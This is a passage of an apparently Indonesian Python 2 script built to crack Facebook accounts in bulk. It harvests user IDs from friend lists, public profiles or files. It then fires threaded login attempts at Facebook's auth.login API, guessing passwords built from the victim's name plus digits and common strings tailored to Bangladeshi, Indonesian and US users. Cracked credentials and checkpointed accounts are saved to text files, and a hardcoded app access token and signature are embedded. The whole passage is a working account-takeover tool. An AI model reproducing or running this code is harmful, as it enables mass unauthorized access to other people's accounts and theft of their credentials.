                                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                            cek.close()
                                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;93mSudah disimpan di \033[1;91m: \033[1;92mdone/indo.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{<\033[1;93mbalik?\033[1;97m>}")
    os.system("python2 mulung.py")
    
##### Mulung Banglades  #####
def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;97m{\x1b[1;91m!\x1b[1;97m} Tokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{\033[1;96m01\033[1;97m} Mulung Dari Daftar Teman"
    print "\033[1;97m{\033[1;96m02\033[1;97m} Mulung Dari Publik/Teman"
    print "\033[1;97m{\033[1;96m03\033[1;97m} Mulung Dari File"
    print "\033[1;97m{\033[1;91m00\033[1;97m} balik?"
    print 50* "\033[1;94m─"
    pilih_bangla()

#### PILIH BANGLADESH ####
def pilih_bangla():
    teak = raw_input("\033[1;96mmahwu yang mana ? \033[91m:\033[1;92m ")
    if teak =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m} Gaada opsi itu smlur"
        pilih_bangla()
    elif teak =="1" or teak =="01":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;96m●●● \033[1;97mMulung Banglades  \033[1;96m●●●")
        print 50* "\033[1;94m─"
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    elif teak =="2" or teak =="02":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("             \033[1;96m●●● \033[1;97mMulung Banglades  \033[1;96m●●●")
        print 50* "\033[1;94m─"
        idb = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m ID Publik/Teman \033[1;91m:\033[1;92m ")
        try:
            pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
            sp = json.loads(pok.text)
            print"\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Nama \033[1;91m:\033[1;92m "+sp["name"]
        except KeyError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
            raw_input("\n\033[1;96m{\033[1;97m<balik?>\033[1;96m}")
            crack_bangla()
        except requests.exceptions.ConnectionError:
            print"{!} Tidak ada koneksi !"
            keluar()
        r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif teak =="3" or teak =="03":
        os.system('clear')
        print logo
        try:
            print 50* "\033[1;94m─"
            print ("             \033[1;96m●●● \033[1;97mMulung Banglades  \033[1;96m●●●")
            print 50* "\033[1;94m─"
            idlist = raw_input('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Nama File \033[1;91m:\033[1;92m ')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
            raw_input('\n\033[1;92m[ \033[1;97mbalik? \033[1;92m]')
        except IOError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
            raw_input("\n\033[1;96m{\033[1;97m<balik?>\033[1;96m}")
            crack_bangla()
    elif teak =="0" or teak =="00":
        menu()
    else:
        print"\033[1;97m{\033[1;91m!\033[1;97m} Gaada opsi itu smlur"
        pilih_bangla()
    
    print "\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Total ID \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Stop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Sedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN BANGLADESH #####
    def main(arg):
        sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower()+'123'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/bangla.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos1
                    cek = open("done/bangla.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = j['first_name'].lower()+'1234'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/bangla.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos2
                            cek = open("done/bangla.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name'].lower()+'12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
                                oke = open("done/bangla.txt", "a")
                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                oke.close()
                                oks.append(zowe)
                            else:
                                if 'www.facebook.com' in ko['error_msg']:
                                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos3
                                    cek = open("done/bangla.txt", "a")
                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos4 = ('786786')
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
                                        oke = open("done/bangla.txt", "a")
                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                        oke.close()
                                        oks.append(zowe)
                                    else:
                                        if 'www.facebook.com' in ko['error_msg']:
                                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos4
                                            cek = open("done/bangla.txt", "a")
                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
                                            cek.close()
                                            cekpoint.append(zowe)
                                        else:
                                            bos5 = ('bangladesh')
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            ko = json.load(data)
                                            if 'access_token' in ko:
                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
                                                oke = open("done/bangla.txt", "a")
                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                oke.close()
                                                oks.append(zowe)
                                            else:
                                                if 'www.facebook.com' in ko['error_msg']:
                                                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos5
                                                    cek = open("done/bangla.txt", "a")
                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
                                                    cek.close()
                                                    cekpoint.append(zowe)
                                                else:
                                                    bos6 = j['first_name'].lower()+'786'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    ko = json.load(data)
                                                    if 'access_token' in ko:
                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
                                                        oke = open("done/bangla.txt", "a")
                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                        oke.close()
                                                        oks.append(zowe)
                                                    else:
                                                        if 'www.facebook.com' in ko['error_msg']:
                                                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos6
                                                            cek = open("done/bangla.txt", "a")
                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
                                                            cek.close()
                                                            cekpoint.append(zowe)
                                                        else:
                                                            bos7 = j['last_name'].lower()+'123'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            ko = json.load(data)
                                                            if 'access_token' in ko:
                                                                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
                                                                oke = open("done/bangla.txt", "a")
                                                                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                oke.close()
                                                                oks.append(zowe)
                                                            else:
                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                    print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                                    print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos7
                                                                    cek = open("done/bangla.txt", "a")
                                                                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(zowe)
                                                                else:
                                                                    bos8 = j['last_name'].lower()+'1234'
                                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    ko = json.load(data)
                                                                    if 'access_token' in ko:
                                                                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                                                                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos8
                                                                        oke = open("done/bangla.txt", "a")
                                                                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                        oke.close()
                                                                        oks.append(zowe)
                                                                    else:
                                                                        if 'www.facebook.com' in ko['error_msg']:
                                                                            print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mCEKPOINT")
                                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;96m") + j['name']
                                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;96m") + zowe
                                                                            print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;96m") + bos8
                                                                            cek = open("done/bangla.txt", "a")
                                                                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
                                                                            cek.close()
                                                                            cekpoint.append(zowe)
                                                                            
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\n\033[1;94m──────────────────────────────────────────────────"
    print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mcape smlurt, gaada lagi '
    print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
    print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mSudah disimpan di \033[1;91m: \033[1;92mdone/bangla.txt'
    print 50* "\033[1;94m─"
    raw_input("\033[1;97m{\033[1;96mbalik?\033[1;97m}")
    os.system("python2 mulung.py")
    
##### MULUNG USA #####
def crack_usa():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;96m[!] \x1b[1;91mTokennya gabener nih asw"
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50* "\033[1;94m─"
    print "\033[1;97m{\033[1;95m01\033[1;97m} Mulung Dari Daftar Teman"
    print "\033[1;97m{\033[1;95m02\033[1;97m} Mulung Dari Publik/Teman"
    print "\033[1;97m{\033[1;95m03\033[1;97m} Mulung Dari File"
    print "\033[1;97m{\033[1;91m00\033[1;97m} balik?"
    print 50* "\033[1;94m─"
    pilih_usa()

#### PILIH USA ####
def pilih_usa():
    teak = raw_input("\033[1;95mmahwu yang mana ? \033[91m:\033[1;92m ")
    if teak =="":
        print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Gaada opsi itu smlur"
        pilih_usa()
    elif teak =="1" or teak =="01":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("                \033[1;95m●●● \033[1;97mMULUNG USA \033[1;95m●●●")
        print 50* "\033[1;94m─"
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
    elif teak =="2" or teak =="02":
        os.system('clear')
        print logo
        print 50* "\033[1;94m─"
        print ("                \033[1;95m●●● \033[1;97mMULUNG USA \033[1;95m●●●")
        print 50* "\033[1;94m─"
        idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Publik/Teman \033[1;91m:\033[1;92m ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama \033[1;91m:\033[1;92m "+op["name"]
        except KeyError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
            raw_input("\n\033[1;95m[\033[1;97mbalik?\033[1;95m]")
            crack_usa()
        except requests.exceptions.ConnectionError:
            print"\033[1;97m{\033[1;91m!\033[1;97m} datanya abis,kalo ga sinyalnya jelek !"
            keluar()
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif teak =="3" or teak =="03":
        os.system('clear')
        print logo
        try:
            print 50* "\033[1;94m─"
            print ("                \033[1;95m●●● \033[1;97mMULUNG USA \033[1;95m●●●")
            print 50* "\033[1;94m─"
            idlist = raw_input('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama File\033[1;91m :\033[1;92m ')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
            raw_input('\n\033[1;92m[ \033[1;97mbalik? \033[1;92m]')
        except IOError:
            print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
            raw_input("\n\033[1;95m[\033[1;97m<balik?>\033[1;95m]")
            crack_usa()
    elif teak =="0" or teak =="00":
        menu()
    else:
        print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Gaada opsi itu smlur"
        pilih_usa()
    
    print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
    print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mStop Tekan CTRL+Z')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mSedang Jadi hemker ea mhank "+o),;sys.stdout.flush();time.sleep(1)
    print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mPake in mode pesawat kalo ga done,kalo ga buang aja hp nya kontol")
    print ("\033[1;94m──────────────────────────────────────────────────")
    
##### MAIN USA #####
    def main(arg):
        sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
        global cekpoint,oks
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
            j = json.loads(an.text)
            bos1 = ('iloveyou')
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            ko = json.load(data)
            if 'access_token' in ko:
                print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
                oke = open("done/usa.txt", "a")
                oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                oke.close()
                oks.append(zowe)
            else:
                if 'www.facebook.com' in ko['error_msg']:
                    print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                    print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos1
                    cek = open("done/usa.txt", "a")
                    cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos2 = ('123456')
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
                        print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
                        oke = open("done/usa.txt", "a")
                        oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                        oke.close()
                        oks.append(zowe)
                    else:
                        if 'www.facebook.com' in ko['error_msg']:
                            print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mCEKPOINT")
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m") + j['name']
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m") + zowe
                            print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m") + bos2
                            cek = open("done/usa.txt", "a")
                            cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos3 = j['first_name']+'123'
